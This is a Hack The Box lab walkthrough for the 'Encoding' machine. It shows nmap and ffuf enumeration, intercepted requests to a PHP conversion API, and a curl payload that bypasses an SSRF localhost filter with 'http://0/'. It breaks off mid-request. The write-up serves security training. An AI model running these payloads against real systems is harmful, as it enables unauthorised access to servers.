<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Encoding HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Encoding HTB Walkthrough"><meta property="og:description" content="Introduction Another exploitable PHP web app that focuses on character conversions. We leverage Local File Inclusion (LFI) to further enumerate the system by looking at Apache config files and PHP source. With some sleuthing, we find work-in-progress code in a git repository &ndash; finding the path to a vulnerable looking PHP script. Knowing this path is only accessible to localhost, we trace back through an existing LFI and use domain confusion in order to perform Server Side Request Forgery."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-04-15-encoding-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-15T00:00:00+10:00"><meta property="article:modified_time" content="2023-04-15T17:59:28+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Encoding HTB Walkthrough"><meta name=twitter:description content="Introduction Another exploitable PHP web app that focuses on character conversions. We leverage Local File Inclusion (LFI) to further enumerate the system by looking at Apache config files and PHP source. With some sleuthing, we find work-in-progress code in a git repository &ndash; finding the path to a vulnerable looking PHP script. Knowing this path is only accessible to localhost, we trace back through an existing LFI and use domain confusion in order to perform Server Side Request Forgery."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-04-15-encoding-htb/><link rel=prev href=https://emdwyer.github.io/2023-04-08-broscience-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Encoding HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-04-15-encoding-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, ctf, php, filter, lfi, ssrf, git, lfi2rce","wordcount":8021,"url":"https:\/\/emdwyer.github.io\/2023-04-15-encoding-htb\/","datePublished":"2023-04-15T00:00:00+10:00","dateModified":"2023-04-15T17:59:28+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Encoding HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-04-15>2023-04-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;8021 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;38 minutes&nbsp;<span id=/2023-04-15-encoding-htb/ class=leancloud_visitors data-flag-title="Encoding HTB Walkthrough">
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./encoding.png data-srcset="./encoding.png, ./encoding.png 1.5x, ./encoding.png 2x" data-sizes=auto alt=./encoding.png title=Encoding></p><h2 id=introduction>Introduction</h2><p>Another exploitable PHP web app that focuses on character conversions. We leverage Local File Inclusion (LFI) to further enumerate the system by looking at Apache config files and PHP source. With some sleuthing, we find work-in-progress code in a git repository &ndash; finding the path to a vulnerable looking PHP script. Knowing this path is only accessible to localhost, we trace back through an existing LFI and use domain confusion in order to perform Server Side Request Forgery. With this, we can execute the vulnerable looking PHP script. From here, we inject a PHP filter chain into the <code>page</code> query parameter, which allows us to leverage LFI to include and execute arbitrary PHP code thanks to encoding conversions prepending controllable characters &ndash; setting up a reverse shell. We privilege escalate to a service account by creating a reverse shell we execute as a <code>git</code> filter. Next, we privilege escalate to root by creating and restarting a systemd unit which spawns a root shell.</p><h2 id=enumeration>Enumeration</h2><p>As usual, we start enumerating running services by port scanning with nmap, <code>-sC</code> for default scripts and <code>-sV</code> to enable version detection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.198
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-04-03 19:20 AEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.198
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.020s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 4fe3a667a227f9118dc30ed773a02c28 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 816e78766b8aea7d1babd436b7f8ecc4 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.52 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.52 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: HaxTables
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 9.26 seconds
</span></span></code></pre></td></tr></table></div></div><p>Browse to the found web server on http://10.10.11.198/:
<img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-03-19-21-48-image.png data-srcset="./assets/2023-04-03-19-21-48-image.png, ./assets/2023-04-03-19-21-48-image.png 1.5x, ./assets/2023-04-03-19-21-48-image.png 2x" data-sizes=auto alt=./assets/2023-04-03-19-21-48-image.png title=./assets/2023-04-03-19-21-48-image.png></p><p>In the Convertions (sic) menu, we can select from String, Integer, Numbers. This presents a form like so:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-03-19-24-46-image.png data-srcset="./assets/2023-04-03-19-24-46-image.png, ./assets/2023-04-03-19-24-46-image.png 1.5x, ./assets/2023-04-03-19-24-46-image.png 2x" data-sizes=auto alt=./assets/2023-04-03-19-24-46-image.png title=./assets/2023-04-03-19-24-46-image.png></p><p>The API page gives us useful information on the available API calls we can make when hitting <a href=http://api.haxtables.htb/ target=_blank rel="noopener noreffer">http://api.haxtables.htb/</a> programmatically:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-03-19-25-54-image.png data-srcset="./assets/2023-04-03-19-25-54-image.png, ./assets/2023-04-03-19-25-54-image.png 1.5x, ./assets/2023-04-03-19-25-54-image.png 2x" data-sizes=auto alt=./assets/2023-04-03-19-25-54-image.png title=./assets/2023-04-03-19-25-54-image.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-03-19-26-24-image.png data-srcset="./assets/2023-04-03-19-26-24-image.png, ./assets/2023-04-03-19-26-24-image.png 1.5x, ./assets/2023-04-03-19-26-24-image.png 2x" data-sizes=auto alt=./assets/2023-04-03-19-26-24-image.png title=./assets/2023-04-03-19-26-24-image.png></p><p>On the string conversions page, we select Base64 encode, enter a string and click Submit &ndash; while intercepting the request in BurpSuite:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-03-19-29-52-image.png data-srcset="./assets/2023-04-03-19-29-52-image.png, ./assets/2023-04-03-19-29-52-image.png 1.5x, ./assets/2023-04-03-19-29-52-image.png 2x" data-sizes=auto alt=./assets/2023-04-03-19-29-52-image.png title=./assets/2023-04-03-19-29-52-image.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /handler.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 10.10.11.198
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://10.10.11.198/index.php?page=string
</span></span><span class=line><span class=cl>Content-Type: application/json;charset=UTF-8
</span></span><span class=line><span class=cl>Content-Length: 73
</span></span><span class=line><span class=cl>Origin: http://10.10.11.198
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;action&#34;:&#34;b64encode&#34;,&#34;data&#34;:&#34;hello world&#34;,&#34;uri_path&#34;:&#34;/v3/tools/string&#34;}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Mon, 03 Apr 2023 09:29:07 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.52 (Ubuntu)
</span></span><span class=line><span class=cl>Vary: Accept-Encoding
</span></span><span class=line><span class=cl>Content-Length: 27
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: text/html; charset=UTF-8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;data&#34;:&#34;aGVsbG8gd29ybGQ=&#34;}
</span></span></code></pre></td></tr></table></div></div><p>Here, I decided to add <code>10.10.11.198 haxtables.htb api.haxtables.htb</code> to my <code>/etc/hosts</code></p><p>Fuzzing the main host with raft medium from <a href=https://github.com/danielmiessler/SecLists target=_blank rel="noopener noreffer">SecLists</a>, a common wordlist for web directories:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://haxtables.htb/FUZZ&#34;</span> -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.4.1-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://haxtables.htb/FUZZ
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>includes                <span class=o>[</span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 27ms<span class=o>]</span>
</span></span><span class=line><span class=cl>assets                  <span class=o>[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 20ms<span class=o>]</span>
</span></span><span class=line><span class=cl>server-status           <span class=o>[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms<span class=o>]</span>
</span></span><span class=line><span class=cl>                        <span class=o>[</span>Status: 200, Size: 1999, Words: 246, Lines: 49, Duration: 38ms<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Fuzzing <code>api.haxtables.htb</code> with the same wordlist:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://api.haxtables.htb/FUZZ&#34;</span> -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.4.1-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://api.haxtables.htb/FUZZ
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v2                      <span class=o>[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 20ms<span class=o>]</span>
</span></span><span class=line><span class=cl>v3                      <span class=o>[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 19ms<span class=o>]</span>
</span></span><span class=line><span class=cl>v1                      <span class=o>[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 24ms<span class=o>]</span>
</span></span><span class=line><span class=cl>server-status           <span class=o>[</span>Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 19ms<span class=o>]</span>
</span></span><span class=line><span class=cl>                        <span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms<span class=o>]</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>30000/30000<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>1761</span> req/sec :: Duration: <span class=o>[</span>0:00:19<span class=o>]</span> :: Errors: <span class=m>2</span> ::
</span></span></code></pre></td></tr></table></div></div><p>So, we have what looks like a versioned API, with versions 1, 2, 3. We can specify different actions to determine the conversion type, specify a <code>data</code> payload directly, or a <code>file_url</code> which the server will retrieve to convert.</p><h2 id=foothold>Foothold</h2><p>The <code>/handler.php</code> script appears to be a wrapper around the API called from the web interface and we can specify the underlying API to use via the <code>uri_path</code>, which we can control (first red flag!).</p><p>I tried some payloads with a modified <code>uri_path</code> similar to the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /handler.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 10.10.11.198
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://10.10.11.198/index.php?page=string
</span></span><span class=line><span class=cl>Content-Type: application/json;charset=UTF-8
</span></span><span class=line><span class=cl>Content-Length: 78
</span></span><span class=line><span class=cl>Origin: http://10.10.11.198
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;action&#34;:&#34;b64encode&#34;,&#34;data&#34;:&#34;hello world!!!&#34;,&#34;uri_path&#34;:&#34;handler.php&#34;}
</span></span></code></pre></td></tr></table></div></div><p>Each time, the server would hang for 5-10 seconds, before giving an empty HTTP 200 response.</p><p>Hitting the URL directly, trying to encode localhost:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X POST <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;http://127.0.0.1&#34;}&#39;</span>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Unacceptable URL&#34;</span><span class=o>}</span>%  
</span></span></code></pre></td></tr></table></div></div><p>So there seems to be some filtering to try and stop us from performing Server Side Request Forgery (SSRF).</p><p>HackTricks has a list of URL format bypasses: <a href=https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass target=_blank rel="noopener noreffer">URL Format Bypass - HackTricks</a> , and <code>http://0/</code> seemed to work:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X POST <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;http://0/index.php&#34;}&#39;</span>                         
